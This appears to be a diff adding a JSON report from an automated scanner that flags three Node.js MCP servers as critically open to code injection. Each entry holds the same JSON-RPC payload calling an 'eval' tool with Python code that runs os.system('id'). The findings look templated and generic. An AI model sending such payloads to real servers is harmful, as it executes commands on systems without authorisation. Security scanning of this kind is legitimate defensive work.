@@ -1,0 +1,35 @@
+{
+    "total": 3,
+    "vulnerabilities": [
+        {
+            "server_url": "https://github.com/0xshariq/docker-mcp-server",
+            "server_name": "docker-mcp-server",
+            "language": "nodejs",
+            "severity": "critical",
+            "file": "dist/index.js",
+            "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload accepted by tool",
+            "payload": "{'jsonrpc': '2.0', 'id': 24, 'method': 'tools/call', 'params': {'name': 'eval', 'arguments': {'code': \"__import__('os').system('id')\"}}}",
+            "remediation": "Review and strengthen input validation and error handling mechanisms."
+        },
+        {
+            "server_url": "https://github.com/0xshariq/github-mcp-server",
+            "server_name": "github-mcp-server",
+            "language": "nodejs",
+            "severity": "critical",
+            "file": "dist/index.js",
+            "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload accepted by tool",
+            "payload": "{'jsonrpc': '2.0', 'id': 24, 'method': 'tools/call', 'params': {'name': 'eval', 'arguments': {'code': \"__import__('os').system('id')\"}}}",
+            "remediation": "Review and strengthen input validation and error handling mechanisms."
+        },
+        {
+            "server_url": "https://github.com/21st-dev/magic-mcp",
+            "server_name": "magic-mcp",
+            "language": "nodejs",
+            "severity": "critical",
+            "file": "dist/index.js",
+            "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload accepted by tool",
+            "payload": "{'jsonrpc': '2.0', 'id': 24, 'method': 'tools/call', 'params': {'name': 'eval', 'arguments': {'code': \"__import__('os').system('id')\"}}}",
+            "remediation": "Review and strengthen input validation and error handling mechanisms."
+        }
+    ]
+}
